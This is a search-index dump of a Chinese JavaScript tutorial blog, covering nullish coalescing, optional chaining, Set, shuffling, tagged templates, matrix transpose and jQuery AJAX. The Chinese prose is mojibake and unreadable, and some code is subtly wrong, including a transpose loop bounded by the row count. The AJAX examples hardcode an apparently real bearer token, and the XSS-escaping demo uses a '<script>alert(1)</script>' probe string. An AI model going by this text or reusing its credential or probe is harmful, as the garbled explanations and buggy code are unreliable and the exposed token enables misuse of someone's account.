12345678910111213const person = { name: null, interesting: '', age: 0}const name = person.name ?? 'PeaNu'const interesting = person.interesting ?? 'coding'const age = person.age ?? 18console.log(name) // 'PeaNu'console.log(interesting) // \"\"console.log(age) // 0 åªè¦ä¸æ˜¯ null undefined é€™äº›ã€ŒçœŸå‡å€¼ã€ï¼Œå° ?? è€Œè¨€éƒ½æ˜¯çœŸå€¼ï¼Œæ‰€ä»¥å°±å¯ä»¥æŠŠ 0 \"\" é€™äº›å‡å€¼çµ¦ç•™ä¸‹ä¾†ã€‚ Optional chaining operator å¯é¸ä¸²é€£é€™å€‹æ±è¥¿ä¸»è¦æ˜¯ç”¨ä¾†è§£æ±ºã€Œå­˜å–å±¬æ€§ã€çš„å•é¡Œï¼Œå…ˆä¾†çœ‹å€‹ä¾‹å­ï¼š 123456789const response = { rows: [ { name: 'PeaNu' } ]}if (response.rows[0].name === 'PeaNu') console.log('this is peanu') å‡å¦‚æˆ‘å€‘æƒ³çœ‹ç¬¬ä¸€ç­†è³‡æ–™çš„ name æ˜¯ä¸æ˜¯ PeaNu çš„è©±å¯èƒ½å°±æœƒåƒä¸Šé¢é€™æ¨£å­å¯«ï¼Œå¯æ˜¯é€™æ¨£æœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯å¦‚æœä»Šå¤© rows æ˜¯ç©ºçš„è©±æ€éº¼è¾¦ï¼Ÿ 1234const response = { rows: []}if (response.rows[0].name === 'PeaNu') console.log('this is peanu') é€™æ™‚å€™å°±æœƒå™´ Errorï¼Œè·Ÿä½ èªª can't not read property of undefinedï¼Œç„¶å¾Œç¨‹å¼å°±æ›äº†ã€‚ æ‰€ä»¥ä½ å¯èƒ½å°±æœƒæ”¹æˆé€™æ¨£å¯«ï¼š 1234const response = { rows: []}if (response.rows[0] &amp;&amp; response.rows[0].name === 'PeaNu') console.log('this is peanu') åˆ©ç”¨çŸ­è·¯é‹ç®—å…ˆç¢ºèª row[0] æ˜¯æœ‰æ±è¥¿çš„æ‰å»å­˜å– nameï¼Œå°±èƒ½é¿å…ç¨‹å¼å‡ºéŒ¯ã€‚ å¥½ï¼Œé€™æ¨£çœ‹èµ·ä¾†å•é¡Œæ˜¯è§£æ±ºäº†ï¼Œå¯æ˜¯ä»Šå¤©å¦‚æœè¦å­˜å–çš„å±¬æ€§ã€Œåœ¨å¾ˆè£¡é¢ã€å‘¢ï¼Ÿ 1234567891011121314151617181920const response = { rows: [ { name: 'PeaNU', age: 20, relationship: { girlFriend: 'PPB', father: 'FeaNut', mother: 'CeaNut' } } ]}if ( response.rows[0] &amp;&amp; response.rows[0].relationship &amp;&amp; response.rows[0].relationship.girlFriend &amp;&amp; response.rows[0].relationship.girlFriend === 'PPB') console.log('peanu has girlfriend') ç•¶æ±è¥¿è¶Šè£¡é¢æ™‚ï¼Œå°±éœ€è¦è¶Šå¤šå€‹ &amp;&amp; ä¾†åšé‹ç®—ï¼Œæœ‰æ²’æœ‰æ›´å¥½çš„åšæ³•ï¼Ÿ é€™æ™‚å€™ ? å°±æ´¾ä¸Šç”¨å ´äº†ï¼Œç”¨ ? å¯ä»¥æ”¹å¯«æˆé€™æ¨£ï¼š 1234567891011121314const response = { rows: [ { name: 'PeaNU', age: 20, relationship: { girlFriend: 'PPB', father: 'FeaNut', mother: 'CeaNut' } } ]}if (response.rows[0]?.relationship?.girlFriend === 'PPB') console.log('peanu has girlfriend') æ„æ€è·Ÿå‰›å‰›æ˜¯ä¸€æ¨£çš„ï¼Œä»–æœƒä¸€è·¯å¾ row[0]ã€relationship å¾€ä¸‹å­˜å–ï¼Œåªè¦ ? å‰é¢çš„æ±è¥¿ä¸å­˜åœ¨ï¼Œå°±æœƒç›´æ¥å›å‚³ undefinedï¼Œæ‰€ä»¥å°±èƒ½é¿å…æ‰ Error çš„å•é¡Œã€‚","link":"/2022/05/05/javascript-nullish-coalescing-operator-and-optional-chaining-operator/"},{"title":"JavaScript é‚„ä¸éŒ¯ç”¨çš„ set","text":"æœ€è¿‘æ‰ç™¼ç¾é€™å€‹å¥½ç”¨çš„æ–¹æ³•ã€‚ ç°¡è¿°new Set æ˜¯ ES6 æ¨å‡ºçš„ä¸€ç¨®è³‡æ–™å‹æ…‹ï¼Œå¦‚æœä½ ä¸å¸Œæœ›ã€ŒArray è£¡å‡ºç¾é‡è¤‡çš„å€¼ã€ï¼Œé€™å€‹çµ•å°å¥½ç”¨ã€‚ å…ˆä¾†çœ‹å€‹ç°¡çŸ­çš„ç¯„ä¾‹ï¼Œä½ å¤§æ¦‚å°±çŸ¥é“ç”¨æ³•äº†ï¼š 123456789101112131415161718192021222324252627const obj = { name: 'PeaNu'}const mySet = new Set() // {}mySet.add(1)mySet.add(1) // é‡è¤‡çš„ä¸æœƒæ”¾é€²å»mySet.add(3)mySet.add(3) // é‡è¤‡çš„ä¸æœƒæ”¾é€²å»mySet.add(5)mySet.add(6)mySet.add(obj)console.log(mySet) // { 1, 3, 5, 6, {name: 'PeaNu'} }console.log(mySet.has(3)) // trueconsole.log(mySet.has(4)) // falseconsole.log(mySet.delete(obj)) // true åˆªé™¤æˆåŠŸconsole.log(mySet.delete(7)) // false åˆªé™¤å¤±æ•—console.log(mySet) // { 1, 3, 5, 6 }console.log(mySet.size) // 4// ä¸‹é¢é€™å¹¾å€‹é‚„ä¸å¤ªç¢ºå®šç”¨é€”ï¼Œå¯ä»¥å…ˆçŸ¥é“ä¸€ä¸‹å°±å¥½ã€‚console.log(mySet.entries())console.log(mySet.keys())console.log(mySet.values()) æ¥ä¸‹ä¾†æœƒç¤ºç¯„å¹¾å€‹å¯¦éš›æ‡‰ç”¨ã€‚ éæ¿¾æ‰é™£åˆ—ä¸­é‡è¤‡çš„å…ƒç´ å› ç‚º new å‡ºä¾†çš„ Set æœƒæ˜¯ Objectï¼Œæ‰€ä»¥è¨˜å¾—ç”¨ ... è½‰æˆ Array å°±å¥½äº†ã€‚ 1234const array = [1, 1, 3, 4, 5, 6, 6, 3, 4]const mySet = new Set(array) // { 1, 3, 4, 5, 6 }const filterArray = [...mySet] // è½‰æˆ arrayconsole.log(filterArray) // [1, 3, 4, 5, 6] æª¢æŸ¥é™£åˆ—ä¸­æ˜¯å¦åŒ…å«æŸç‰©ä»¶123456789101112131415161718192021222324const classroom = new Set()const PeaNu = { id: 1, name: 'PeaNu' }const PPB = { id: 2, name: 'PPB' }const Nick = { id: 3, name: 'Nick' }// æŠŠå­¸ç”ŸåŠ å…¥ Setclassroom.add(PeaNu)classroom.add(PPB)classroom.add(Nick)// æª¢æŸ¥ PeaNu åœ¨ä¸åœ¨ Set è£¡if (classroom.has(PeaNu)) { console.log(`${PeaNu.name} is in the classroom`)}// ç§»é™¤ Nickclassroom.delete(Nick)if (!classroom.has(Nick)) { console.log('Can not find Nick')}// é¡¯ç¤º Set çš„æ•¸é‡console.log(`Now there are ${classroom.size} students`)","link":"/2022/04/23/javascript-set/"},{"title":"JavaScriptï¼shuffleï¼ˆæ´—ç‰Œçš„æ–¹æ³•ï¼‰","text":"æ…¢æ…¢ç´¯ç©ç¶“é©—ã€‚ é¡Œç›®å‡è¨­æˆ‘æœ‰ä¸€ä»½é€™æ¨£çš„è³‡æ–™ï¼š 1const data = [1, 2, 3, 4, 5, 6, 7, ...] å¦‚æœæˆ‘æƒ³æ‰“äº‚é †åºçš„è©±æœ‰ä»€éº¼åšæ³•ï¼Ÿ æ–¹æ³•ä¸€å¯ä»¥åˆ©ç”¨ Math.random - 0.5 æ­é… sort ä¾†éš¨æ©Ÿçš„äº¤æ›ä½ç½®ï¼š 1const shuffled = data.sort(() =&gt; Math.random() - 0.5) é€™æ‡‰è©²æ˜¯æœ€ç°¡æ½”çš„åšæ³•ï¼ŒåŸç†æ˜¯åˆ©ç”¨ Math.random åªæœƒç”¢ç”Ÿ 0 ~ 0.99999 çš„ç‰¹æ€§ã€‚åœ¨é€™å€‹ç¯„åœä¸­ -0.5ï¼Œå°±æœ‰ä¸€åŠçš„æ©Ÿæœƒå¾—åˆ°ã€Œæ­£æ•¸ / è² æ•¸ã€ã€‚ æ¥è‘—å†æ­é… sort çš„ compare functionï¼Œåœ¨é€™è£¡é¢åªè¦å›å‚³æ­£æ•¸å°±æœƒäº¤æ›ä½ç½®ï¼Œè² æ•¸çš„è©±å°±ä¸æ›ä½ç½®ï¼Œæ‰€ä»¥é€éå‰é¢ç”¢ç”Ÿçš„ N å€‹æ­£æ•¸å’Œ M å€‹è² æ•¸å°±æœƒçµ„åˆå‡ºä¸åŒçš„ä½ç½®ã€‚ æ–¹æ³•äºŒé€™æ˜¯æˆ‘è‡ªå·±æƒ³åˆ°çš„æ–¹æ³•ï¼Œæ„Ÿè¦ºæ•ˆèƒ½ä¸Šå¯èƒ½ä¸å¤ªå¥½ï¼Œä½†ä¹Ÿä¸å¤±ç‚ºä¸€ç¨®ä½œæ³•ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯çµ¦ä¸€å€‹é•·åº¦ï¼Œè£¡é¢æœƒä¸æŒ‰ç…§é †åºä¾†æ”¾æ•¸å­—ï¼Œä¾‹å¦‚ï¼šé•·åº¦ç‚º 4ï¼Œçµæœç”¢å‡º [0, 3, 1, 2] é€™æ¨£çš„æ±è¥¿ã€‚ é€™äº›æ•¸å­—æ˜¯è¦æ‹¿ä¾†ç•¶ä½œ index ç”¨çš„ï¼Œä¸å¦‚ç›´æ¥çœ‹ code å§ï¼š 1234567891011121314function createRandomNumArray(total) { const res = new Array(0) while (res.length &lt; total) { // ç”¢ç”Ÿ 0 ~ total é–“çš„æ•¸å­—ï¼ˆåŒ…å« 0 &amp; totalï¼‰ const num = Math.floor(Math.random() * total) // æ’é™¤æ‰é‡è¤‡çš„æ•¸å­— if (res.some((n) =&gt; n === num)) { continue } else { res.push(num) } } return res} æ¥è‘—åªè¦åˆ©ç”¨å®ƒä¾†ç”¢ç”Ÿæ–°çš„é™£åˆ—å°±è¡Œäº†ï¼š 12const data = [1, 2, 3, 4]const shuffledData = createRandomNumArray(data.length).map((i) =&gt; data[i]) ç¸½ä¹‹é€™ä¹Ÿæ˜¯ä¸€ç¨®æ–¹æ³•ï¼Œä½†ä¸å»ºè­°ç”¨åœ¨è³‡æ–™é‡å¾ˆå¤§çš„æ™‚å€™ï¼Œå› ç‚ºè¦ä¸€ç›´æ’é™¤æ‰é‡è¤‡çš„æ•¸å­—å¯èƒ½æœƒæµªè²»å¾ˆå¤šè¨ˆç®—ã€‚","link":"/2022/06/29/javascript-shuffle/"},{"title":"å­—ä¸²æ¨¡æ¿çš„é€²éšç”¨æ³• tagged-template","text":"ç¬¬ä¸€æ¬¡çŸ¥é“ï¼ ç°¡è¿°ES6 ä¸­çš„ã€Œtemplate stringã€é™¤äº†æœ€åŸæœ¬çš„å­—ä¸²æ‹¼æ¥ç”¨é€”ä»¥å¤–ï¼Œå®ƒé‚„èƒ½ç”¨ä¾† trigger functionï¼Œç”¨æ³•æ˜¯é€™æ¨£å­ï¼š 1console.log`hello` // ['hello'] æ”¾åœ¨è£¡é¢çš„æ±è¥¿æœƒè¢«è½‰æˆ Array å†å‚³å…¥é€²å»ï¼Œé€™æ˜¯ç¬¬ä¸€ç¨®ç”¨æ³•ã€‚ ç¬¬äºŒç¨®ç”¨æ³•æ˜¯åŠ ä¸Š ${...}ï¼Œå®ƒçš„è¡Œç‚ºæ¯”è¼ƒç‰¹åˆ¥ä¸€é»ï¼Œé‚Šçœ‹ä¾‹å­é‚Šè§£é‡‹ï¼š 12const name = 'peanu'console.log`hello ${name}` // ['hello ', ''] peanu ç°¡å–®ä¾†èªªï¼Œæ²’æœ‰ç”¨ ${...} åŒ…ä½çš„å…§å®¹æœƒè¢«ç”¨ Array ä¾†åŒ…è£ï¼Œè€Œ ${...} çš„éƒ¨åˆ†æœƒè¢«æ”¾åˆ°å¾Œé¢å»ã€‚ï¼ˆé—œæ–¼ Array è£¡çš„ç©ºå­—ä¸²ï¼Œä½ åªè¦è¨˜å¾—æ¯ç•¶å‡ºç¾ ${...} çš„åœ°æ–¹å¾Œé¢éƒ½æœƒè‡ªå‹•è£œä¸€å€‹ç©ºå­—ä¸²ã€‚é€™å€‹è¡Œç‚ºæœƒè®“æˆ‘å€‘ç”¨èµ·ä¾†æ¯”è¼ƒæ–¹ä¾¿ï¼Œä¸ç”¨å¤ªåŸ·è‘—åŸå› ã€‚ï¼‰ OKï¼Œä½ å¯èƒ½æœƒæƒ³èªªé€™å¯ä»¥åšå•¥ï¼Ÿè®“æˆ‘å†èˆ‰å€‹ä¾‹å­ï¼š 12345678910// ...é‹ç®—å­æœƒæŠŠå‰©ä¸‹çš„ params è®Šæˆ arrayfunction saySometing(a, ...b) { console.log('a: ', a) console.log('b: ', b)}const name = 'peanu'const msg = 'how are you'const time = 'today'saySometing`hello ${name}, ${msg}, ${time}` ç™¼ç¾äº†å—ï¼Ÿé€éé€™ç¨®æ–¹å¼æˆ‘å°±å¯ä»¥æŠŠåƒæ•¸æ‹†æˆå…©å€‹éƒ¨åˆ†ï¼Œä¸€å€‹æ˜¯ç´”å­—ä¸²ï¼Œä¸€å€‹æ˜¯ ${...}ã€‚ æ‰€ä»¥å‘¢ï¼Œç”¨é€™æ‹›æˆ‘å°±å¯ä»¥åšå‡ºä¸€å€‹ç”¨ä¾†ã€Œéæ¿¾æƒ¡æ„å­—ä¸²ï¼ˆXSSï¼‰ã€çš„ functionï¼š 12345678910111213function safeHTML(template, ...unsafe) { // åœ¨ template[0] è·Ÿ template[i+1] ä¹‹é–“ join ä¸å®‰å…¨å­—ä¸² let result = template[0] for (let i = 0; i &lt; unsafe.length; i++) { result += unsafe[i].replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&amp;lt;').replace(/&gt;/g, '&amp;gt;') result += template[i + 1] } return result}const unsafe = `&lt;script&gt;alert(1)&lt;/script&gt;`let message = safeHTML`&lt;p&gt;${unsafe} has ${unsafe} sent you a message.&lt;/p&gt;`console.log(message) ç¸½ä¹‹åªæ˜¯æƒ³ä»‹ç´¹ä¸€ä¸‹é€™ç¨® trigger function çš„å¦å¤–ä¸€ç¨®ç”¨é€”ï¼Œé€™ä¹Ÿæ˜¯ style component çš„åŸ·è¡ŒåŸç†ã€‚","link":"/2022/04/04/javascript-tagged-template/"},{"title":"ç”¨ JavaScript ä¾†å¯«å‡ºè½‰ç½®çŸ©é™£çš„æ–¹å¼","text":"ä¹…é•çš„é‚è¼¯æ™‚é–“ï½ ç°¡è¿°å‡è¨­æˆ‘æœ‰ä»¥ä¸‹é™£åˆ—ï¼š 123456const array = [ [1, 2, 3], [1, 2, 3], [1, 2, 3], [1, 2, 3]] æˆ‘å¸Œæœ›è½‰ç½®å¾Œè®Šæˆé€™æ¨£ï¼š 12345;[ [1, 1, 1, 1], [2, 2, 2, 2], [3, 3, 3, 3]] ç¬¬ä¸€ç¨®æ–¹å¼é€™è£¡çš„æ€è·¯æ˜¯é€™æ¨£ï¼š å…ˆç”¨ä¸€å±¤è¿´åœˆéæ­·æ¯å€‹ row æ¯ä¸€åœˆéƒ½å»ºç«‹ä¸€å€‹æ–°çš„ array æ¥è‘—åœ¨ç”¨ç¬¬äºŒå±¤è¿´åœˆéæ­·æ¯å€‹ row é€™æ™‚å€™ç¬¬äºŒå±¤è¿´åœˆå°±å¯ä»¥åˆ©ç”¨å¤–å±¤è¿´åœˆçš„ iï¼Œä¾†å–å‡ºç¬¬ j å€‹ row çš„ç¬¬ i å€‹å€¼ æœ€å¾Œä¸€å€‹æ­¥é©Ÿæœ€é‡è¦ï¼Œä½†ä¹Ÿæ¯”è¼ƒé›£æ‡‚ä¸€äº›ï¼Œå»ºè­°æ­é…ä¸‹é¢çš„ code å¤šæƒ³å¹¾éã€‚ ç°¡å–®ä¾†èªªåŸç†å°±æ˜¯å¤–é¢çš„è¿´åœˆä¸€å®šè¦ç­‰è£¡é¢çš„è¿´åœˆè·‘å®Œæ‰æœƒè·‘ä¸‹ä¸€åœˆï¼Œæ‰€ä»¥å¯ä»¥ç¢ºä¿åœ¨è·‘ j è¿´åœˆçš„æ™‚å€™ i çš„å€¼æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å°±å¯ä»¥é”æˆé€™æ¨£çš„æ•ˆæœï¼š array[0][0] array[1][0] array[2][0] â€¦ 123456789101112131415const array = [ [1, 2, 3], [1, 2, 3], [1, 2, 3], [1, 2, 3]]const newArray = []for (let i = 0; i &lt; array.length; i++) { newArray.push([]) for (let j = 0; j &lt; array.length; j++) { newArray[i].push(array[j][i]) }} ç¬¬äºŒç¨®æ–¹å¼æˆ‘å…ˆå¯«ç°¡åŒ–éå¾Œçš„ç‰ˆæœ¬ï¼Œåªè¦ä¸€è¡Œå°±æå®šï¼š 123function transpose(matrix) { return matrix[0].map((col, i) =&gt; matrix.map((row) =&gt; row[i]))} ä½†é€™æ¨£ä¸€å®šçœ‹ä¸æ‡‚ï¼Œæ‰€ä»¥ä¸€æ¨£ä¾†æ‹†è§£é€™å€‹æµç¨‹ï¼š 12345678910111213141516const array = [ [1, 2, 3], [1, 2, 3], [1, 2, 3], [1, 2, 3]]// ç¬¬ä¸€å±¤ mapconst newArray3 = []for (let i = 0; i &lt; array[0].length; i++) { // ç¬¬äºŒå±¤ map const tempArray = [] for (let j = 0; j &lt; array.length; j++) { tempArray.push(array[j][i]) } newArray3.push(tempArray)} ä½ ä»”ç´°çœ‹å°±æœƒç™¼ç¾é€™è·Ÿç¬¬ä¸€ç¨®ä½œæ³•çš„æ€è·¯æ˜¯å·®ä¸å¤šçš„ï¼Œé‡é»éƒ½æ˜¯è¦æ‹¿å‡ºï¼š array[0][0] array[1][0] array[2][0] â€¦ åªæ˜¯é€™é‚Šæ˜¯å…ˆéæ­· columnï¼Œè—‰æ­¤å–å¾— column çš„é•·åº¦ï¼Œæ¥è‘—åœ¨éæ­·æ¯å€‹ rowï¼Œä¸€æ¨£åˆ©ç”¨ i æœƒç­‰ j è·‘å®Œçš„æ¦‚å¿µä¾†æŠŠæ¯å€‹ row çš„ç¬¬ i å€‹å€¼æ‹¿å‡ºä¾†ç”¢ç”Ÿä¸€å€‹æ–°çš„é™£åˆ—ï¼Œæœ€å¾Œå†åŒ…ä¸€å±¤é™£åˆ—ä¾†ç”¢å‡ºæœ€å¾Œçš„çµæœã€‚ï¼ˆé€™é‚Šè½ä¸æ‡‚çš„è©±ï¼Œå»ºè­°ä½ å…ˆå›ä¸Šé¢æŠŠç¬¬ä¸€ç¨®å¼„æ‡‚å†å›ä¾†çœ‹ï¼Œæ‡‰è©²æœƒå¥½ç†è§£ä¸€äº›ï¼‰","link":"/2022/04/17/javascript-transpose-matrix/"},{"title":"ç”¨ jQuery ç™¼ AJAX","text":"ç­†è¨˜ä¸€ä¸‹ï¼Œä¸ç„¶æœ‰é»é›œã€‚ ç°¡è¿°é€™è£¡æœƒæ‹¿é€™éš» API ä¾†ç¤ºç¯„ã€‚ ä¸»è¦æ˜¯æœ‰äº›åƒæ•¸å®¹æ˜“ææ··ï¼Œé€™é‚Šå…ˆèªªæ˜æ¸…æ¥šï¼š dataType é æœŸ server è¦å›å‚³çš„è³‡æ–™æ ¼å¼ï¼Œæ²’æŒ‡å®šçš„è©±å°±çœ‹ server æ€éº¼è¨­å®šã€‚ contentType è¦å‚³çµ¦ server çš„è³‡æ–™æ ¼å¼ï¼Œæ²’æŒ‡å®šçš„è©±æœƒæ˜¯ application/x-www-form-urlencoded; charset=UTF-8 å‚³é€åŸç”Ÿè¡¨å–®è³‡æ–™ï¼ˆapplication/x-www-form-urlencodedï¼‰HTMLï¼š 1234567&lt;form method=\"POST\" action=\"https://gorest.co.in/public/v2/users\"&gt; &lt;div&gt;&lt;input name=\"name\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"gender\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"email\" type=\"email\" /&gt;&lt;/div&gt; &lt;input name=\"status\" value=\"active\" type=\"hidden\" /&gt; &lt;input type=\"submit\" value=\"é€å‡º\" /&gt;&lt;/form&gt; jQueryï¼š 12345678910111213141516171819202122// å–å¾—è¡¨å–®å…ƒç´ const form = $('form')// è¨­å®šç›£è½å™¨form.bind('submit', (e) =&gt; { // åœæ­¢é è¨­è¡Œç‚º e.preventDefault() // ç™¼å‡º request $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer xxxx' }, // é æœŸå›å‚³çš„è³‡æ–™æ ¼å¼ dataType: 'json', // è¦å‚³éå»çš„è³‡æ–™æ ¼å¼ contentType: 'application/x-www-form-urlencoded; charset=UTF-8', // serialize() å–å¾—è¡¨å–®çš„æ¬„ä½å€¼ data: $('form').serialize(), success: (response) =&gt; console.log(response) })}) serialize() æ˜¯ jQuery æä¾›çš„æ–¹æ³•ï¼Œç”¨ä¾†æŠŠè¡¨å–®è³‡æ–™è½‰æˆé€™æ¨£çš„ url çš„å­—ä¸²æ ¼å¼ï¼šname=xxx&amp;gender=xxx&amp;ã€‚ å®ƒæœƒæ ¹æ“š selector æ±ºå®šæ˜¯ã€Œæ•´å€‹è¡¨å–®ã€é‚„æ˜¯ã€Œå–®ä¸€å…ƒç´ ã€ï¼Œè©³ç´°å¯åƒè€ƒå®˜æ–¹èªªæ˜ ç”¨ FormData ç‰©ä»¶ç™¼ POSTFormData å› ç‚ºæ˜¯ç”¨ç‰©ä»¶ä¾†åŒ…è³‡æ–™ï¼Œæ‰€ä»¥è¦ç‰¹åˆ¥è¨­å®šå…©å€‹æ±è¥¿ï¼š processData: false ä¸è¦å»å‹•è³‡æ–™ contentType: false ä¸è¦è¨­å®š contentType HTMLï¼š 1234567&lt;form method=\"POST\" action=\"https://gorest.co.in/public/v2/users\"&gt; &lt;div&gt;&lt;input name=\"name\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"gender\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"email\" type=\"email\" /&gt;&lt;/div&gt; &lt;input name=\"status\" value=\"active\" type=\"hidden\" /&gt; &lt;input type=\"submit\" value=\"é€å‡º\" /&gt;&lt;/form&gt; jQueryï¼š 123456789101112131415161718192021222324const form = $('form')// è¨­å®šç›£è½å™¨form.bind('submit', (e) =&gt; { // é˜»æ­¢é è¨­è¡Œç‚º e.preventDefault() // ç”¨ FormData è¨­å®šè¡¨å–®å…§å®¹ const formData = new FormData(e.target) // é€å‡º request $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer xxx' }, dataType: 'json', // è¦å‚³éå»çš„è³‡æ–™ data: formData, // é€™é‚Šä¸€å®šè¦è¨­å®šï¼Œä¸ç„¶æœƒï¼š // Uncaught TypeError: Illegal invocation processData: false, contentType: false, success: (response) =&gt; console.log(response) })}) å‚³é€ JSON æ ¼å¼çš„è³‡æ–™HTMLï¼š 1&lt;button class=\"btn\"&gt;é€å‡º&lt;/button&gt; jQueryï¼š 12345678910111213141516171819202122// è¦å‚³é€çš„è³‡æ–™const data = { name: 'ppasp', gender: 'male', email: 'qwqqekeop@gmail.com', status: 'active'}$('.btn').bind('click', () =&gt; { $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer fec7e32332c2367cc51b5669e8397e54f171439891820bfa3bfe420cf6a5c996' }, dataType: 'json', // è¦è¨˜å¾— stringify data: JSON.stringify(data), contentType: 'application/json; charset=utf-8', success: (response) =&gt; console.log(response) })}) ç›´æ¥å‚³é€ JavaScript ç‰©ä»¶é€™ç¨®æ–¹å¼è¦æŠŠ Content-Type è¨­å®šç‚º application/x-www-form-urlencoded; charset=UTF-8ã€‚å¾ payload çµæœæ¨æ¸¬æ˜¯å› ç‚ºç›´æ¥å‚³ Object çš„è©±ç€è¦½å™¨æœƒè‡ªå‹•è½‰æˆè¡¨å–®çš„æ ¼å¼ï¼šname=xxx&amp;gender=xxx&amp;ï¼Œæ‰€ä»¥æ‰è¦ç‰¹åˆ¥è¨­ç½®ã€‚ HTMLï¼š 1&lt;button class=\"btn\"&gt;é€å‡º&lt;/button&gt; jQueryï¼š 12345678910111213141516171819202122const data = { name: 'ppasweqeasp', gender: 'male', email: 'qwqasdqqekeop@gmail.com', status: 'active'}$('.btn').bind('click', () =&gt; { $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer fec7e32332c2367cc51b5669e8397e54f171439891820bfa3bfe420cf6a5c996' }, dataType: 'json', // ä¸åš stringify data: data, // ä¸æ˜¯ application/json; charset=utf-8 contentType: 'application/x-www-form-urlencoded; charset=UTF-8', success: (response) =&gt; console.log(response) })})","link":"/2022/02/23/jquery-ajax/"},{"title":"jQuery éš¨ç­†è¨˜","text":"éš¨ç­†è¨˜ã€‚ ä¸€äº›å¸¸ç”¨æˆ–å®¹æ˜“å¿˜çš„ API $('selector1, selector2, selectorN') é¸å–å¤šå€‹å…ƒç´ ï¼ˆå°±è·Ÿ CSS çš„æ¦‚å¿µç›¸åŒï¼‰ 123456789&lt;div class=\"parent\"&gt; &lt;p class=\"p1\"&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt; &lt;section&gt;&lt;/section&gt;&lt;/div&gt; 12// S.fn.init(2)&nbsp;[div.parent, p.p1]console.log($('.parent, .p1')) get() æŠŠ jQuery ç‰©ä»¶è®Šæˆ DOM å…ƒç´ ï¼ˆé™£åˆ—ï¼‰ï¼š 1&lt;div class=\"parent\"&gt;&lt;/div&gt; 1234// S.fn.init&nbsp;[div.parent] -&gt; Objectconsole.log($('.parent'))// [div.parent] -&gt; Arrayconsole.log($('.parent').get()) find('selector') é¸åˆ°æ‰€æœ‰å­å­«å…ƒç´ ï¼ˆå¤šå±¤ï¼‰ 12345678&lt;div class=\"parent\"&gt; &lt;p&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 123// ç™½è©±ä¾†èªª = é¸åˆ° .parent åº•ä¸‹æ‰€æœ‰çš„ p// æ¥è‘—æŠŠæ¯å€‹ p éƒ½è¨­ç‚ºç´…è‰²$('.parent').find('p').css('background-color', 'red') children(['selector']) é¸åˆ°æ‰€æœ‰å­å…ƒç´ ï¼ˆä¸€å±¤ï¼‰ 12345678&lt;div class=\"parent\"&gt; &lt;p&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 12// &lt;p&gt; &lt;p&gt; &lt;div&gt;console.log($('.parent').children()) è£¡é¢ä¹Ÿå¯ä»¥å†å¡æ–°çš„ selectorï¼š 1234567const tagNames = $('.parent') .children('p') // å¾ jQuery ç‰©ä»¶è½‰æˆ DDM å…ƒç´  .get() .map((elem) =&gt; elem.tagName)// &nbsp;['P', 'P']console.log(tagNames) JavaScriptï¼š 12// &lt;p&gt; &lt;p&gt; &lt;div&gt;console.log(document.querySelector('.parent').children) contents() é¸å‡ºæ‰€æœ‰å­å…ƒç´ ï¼ˆåŒ…å«æ–‡å­—ç¯€é»ï¼‰ 12345678&lt;div class=\"parent\"&gt; &lt;p&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; jQueryï¼š 12// S.fn.init(7)&nbsp;[text, p, text, p, text, div.child, text]console.log($('.parent').contents()) JavaScriptï¼š 12// [text, p, text, p, text, div.child, text]console.log(document.querySelector('.parent').childNodes) attr('attrName', 'attrValue') è¨­å®šå±¬æ€§ jQueryï¼š 12// &lt;div tooltip=\"è«‹è¼¸å…¥å…§å®¹\"&gt;&lt;/div&gt;$('div').attr('tooltip', 'è«‹è¼¸å…¥å…§å®¹') JavaScriptï¼š 12// &lt;div tooltip=\"è«‹è¼¸å…¥å…§å®¹\"&gt;&lt;/div&gt;document.querySelector('div').setAttribute('tooltip', 'è«‹è¼¸å…¥å…§å®¹') removeAttr('attrName') åˆªé™¤å±¬æ€§ jQueryï¼š 1$('div').removeAttr('tooltip') JavaScriptï¼š 1document.querySelector('div').removeAttribute('tooltip') $('parent').append() æŠŠæ±è¥¿æ”¾åˆ°çˆ¶å…ƒç´ è£¡ï¼ˆæœ€å¾Œé¢ï¼‰ 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678910$('.container').append( $('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') } })) $('child').appendTo() æŠŠè‡ªå·±æ”¾åˆ°çˆ¶å…ƒç´ è£¡ï¼ˆæœ€å¾Œé¢ï¼‰ 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678$('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') }}).appendTo('.container') $('child').prependTo() æŠŠè‡ªå·±æ”¾åˆ°çˆ¶å…ƒç´ è£¡ï¼ˆæœ€å‰é¢ï¼‰ 12345&lt;div class=\"container\"&gt; 